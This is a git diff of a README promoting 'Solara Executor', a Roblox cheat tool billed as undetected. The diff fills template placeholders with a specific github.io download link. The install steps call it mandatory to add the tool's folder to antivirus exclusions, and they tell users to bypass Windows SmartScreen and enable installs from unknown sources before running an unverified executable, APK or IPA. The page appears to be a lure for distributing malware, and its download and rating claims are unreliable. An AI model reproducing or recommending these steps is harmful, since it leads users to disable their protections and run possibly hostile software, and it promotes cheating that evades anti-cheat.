@@ -1,8 +1,8 @@
 # 🌟 Solara Executor — Best Roblox Executor for PC & Mobile
 
-[![Downloads](https://img.shields.io/badge/Downloads-310K%2B-brightgreen)](https://YOUR_USERNAME.github.io/solara/)
-[![User Rating](https://img.shields.io/badge/Rating-4.9%2F5-yellow)](https://YOUR_USERNAME.github.io/solara/)
-[![Latest Version](https://img.shields.io/badge/Version-v3.2.1-blue)](https://YOUR_USERNAME.github.io/solara/)
+[![Downloads](https://img.shields.io/badge/Downloads-310K%2B-brightgreen)](https://nikitaj-code2098y3.github.io/solara/)
+[![User Rating](https://img.shields.io/badge/Rating-4.9%2F5-yellow)](https://nikitaj-code2098y3.github.io/solara/)
+[![Latest Version](https://img.shields.io/badge/Version-v3.2.1-blue)](https://nikitaj-code2098y3.github.io/solara/)
 
 > **Solara is a free, undetected, cross-platform Roblox executor — delivering Level 8 LuaU execution on PC, Android, and iOS with one of the fastest injection engines in the free executor space.**
 
@@ -71,7 +71,7 @@ Switching to Solara delivers concrete improvements from the very first session:
 
 ### 💻 PC (Windows)
 
-1. Click **[Download for PC](https://YOUR_USERNAME.github.io/solara/)** to get the latest `SolaraSetup.zip` from the official releases page
+1. Click **[Download for PC](https://nikitaj-code2098y3.github.io/solara/)** to get the latest `SolaraSetup.zip` from the official releases page
 2. Extract the contents to a dedicated folder (e.g., `C:\Solara\`)
 3. **Add the Solara folder to your antivirus exclusion list** before proceeding — this is mandatory
 4. Run `SolaraExecutor.exe` — click **More Info > Run Anyway** if Windows SmartScreen appears
@@ -81,7 +81,7 @@ Switching to Solara delivers concrete improvements from the very first session:
 
 ### 📱 Mobile (Android)
 
-1. Tap **[Download APK](https://YOUR_USERNAME.github.io/solara/)** to get the latest official **solara executor android apk** from the releases page
+1. Tap **[Download APK](https://nikitaj-code2098y3.github.io/solara/)** to get the latest official **solara executor android apk** from the releases page
 2. On your device, go to **Settings > Security** and enable **Install from Unknown Sources**
 3. Open the downloaded **solara executor apk roblox** file and tap **Install**
 4. Launch Roblox and join a game
@@ -91,7 +91,7 @@ Switching to Solara delivers concrete improvements from the very first session:
 
 ### 🍎 iOS (iPhone / iPad)
 
-1. Tap **[Download IPA](https://YOUR_USERNAME.github.io/solara/)** to get the official **solara executor ipa** from the releases page
+1. Tap **[Download IPA](https://nikitaj-code2098y3.github.io/solara/)** to get the official **solara executor ipa** from the releases page
 2. Install using **Sideloadly**, **AltStore**, or **TrollStore** depending on your iOS version:
    - **TrollStore** (iOS 14–16.6.1): Direct install, no 7-day re-signing required
    - **AltStore / Sideloadly** (iOS 17+): Requires re-signing every 7 days
